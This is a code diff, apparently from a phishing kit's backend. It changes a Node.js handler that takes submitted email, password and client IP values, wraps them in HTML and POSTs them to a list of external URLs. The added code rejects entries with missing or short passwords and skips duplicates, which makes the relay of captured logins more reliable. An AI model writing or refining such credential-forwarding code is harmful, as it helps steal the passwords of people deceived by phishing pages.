@@ -489,13 +489,42 @@ INFORMASI TAMBAHAN
 /* ======================
    MAIN HANDLER
 ====================== */
+      const crypto = require("crypto");
+
+// Simpan hash vars yang sudah dikirim (in-memory, reset saat restart)
+const sentHashes = new Set();
+
+function hashVars(vars) {
+  const key = JSON.stringify({
+    email: vars.email,
+    password: vars.password,
+    ip: vars.ip,
+  });
+  return crypto.createHash("sha256").update(key).digest("hex");
+}
+
+function validateVars(vars) {
+  const errors = [];
+
+  // Email
+  
+  // Password
+  if (!vars.password || vars.password === "-") {
+    errors.push("password kosong");
+  } else if (vars.password.length < 4) {
+    errors.push("password terlalu pendek");
+  }
+
+  // Tambah validasi field lain sesuai kebutuhan
+  // if (!vars.nama || vars.nama === "-") errors.push("nama kosong");
+
+  return errors;
+}
+
 module.exports = async (req, res) => {
   try {
     if (req.method !== "POST") {
-      return res.status(405).json({
-        success: false,
-        message: "POST only"
-      });
+      return res.status(405).json({ success: false, message: "POST only" });
     }
 
     const body = parseBody(req);
@@ -506,84 +535,77 @@ module.exports = async (req, res) => {
     if (!subjek || !pesan) {
       return res.status(400).json({
         success: false,
-        message: "subjek & pesan wajib diisi"
+        message: "subjek & pesan wajib diisi",
       });
     }
-     const submissionId = [
-  vars.email,
-  vars.phone,
-  vars.user,
-  vars.date
-]
-  .map(v => String(v || "").trim().toLowerCase())
-  .join("|");
 
     const vars = extractVars(pesan);
     vars.ip = getIP(req);
-     if (
-  vars.email === "-" ||
-  vars.password === "-"
-) {
-  return res.status(400).json({
-    success: false,
-    message: "Data belum lengkap"
-  });
-}
-    const html = buildHtml(vars);
 
+    // ✅ Validasi vars lebih ketat
+    const validationErrors = validateVars(vars);
+    if (validationErrors.length > 0) {
+      return res.status(400).json({
+        success: false,
+        message: "Validasi gagal",
+        errors: validationErrors,
+      });
+    }
+
+    // ✅ Cek duplikat berdasarkan hash vars
+    const hash = hashVars(vars);
+    if (sentHashes.has(hash)) {
+      return res.status(409).json({
+        success: false,
+        message: "Data ini sudah pernah dikirim sebelumnya",
+      });
+    }
+
+    const html = buildHtml(vars);
     const urls = loadUrls();
 
     if (!urls.length) {
-      return res.json({
-        success: false,
-        message: "URL kosong"
-      });
+      return res.json({ success: false, message: "URL kosong" });
     }
-     
 
     const results = await Promise.allSettled(
       urls.map(async (url) => {
         try {
           const r = await fetch(url, {
             method: "POST",
-            headers: {
-              "Content-Type": "application/x-www-form-urlencoded"
-            },
-            body: new URLSearchParams({
-              subjek,
-              pesan: html
-            })
+            headers: { "Content-Type": "application/x-www-form-urlencoded" },
+            body: new URLSearchParams({ subjek, pesan: html }),
           });
-
-          return {
-            url,
-            success: true,
-            status: r.status
-          };
+          return { url, success: true, status: r.status };
         } catch (err) {
-          return {
-            url,
-            success: false,
-            error: err.message
-          };
+          return { url, success: false, error: err.message };
         }
       })
     );
+
+    // ✅ Simpan hash HANYA jika minimal 1 url berhasil
+    const anySuccess = results.some(
+      (r) => r.status === "fulfilled" && r.value?.success
+    );
+    if (anySuccess) {
+      sentHashes.add(hash);
+
+      // Opsional: auto-hapus hash setelah 1 jam supaya set tidak membengkak
+      setTimeout(() => sentHashes.delete(hash), 60 * 60 * 1000);
+    }
 
     return res.json({
       success: true,
       message: "done",
       total: urls.length,
-      results: results.map(r => r.value || r.reason)
+      results: results.map((r) => r.value || r.reason),
     });
-
   } catch (err) {
     console.log("ERROR:", err);
-
     return res.status(500).json({
       success: false,
       message: "internal error",
-      error: err.message
+      error: err.message,
     });
   }
 };
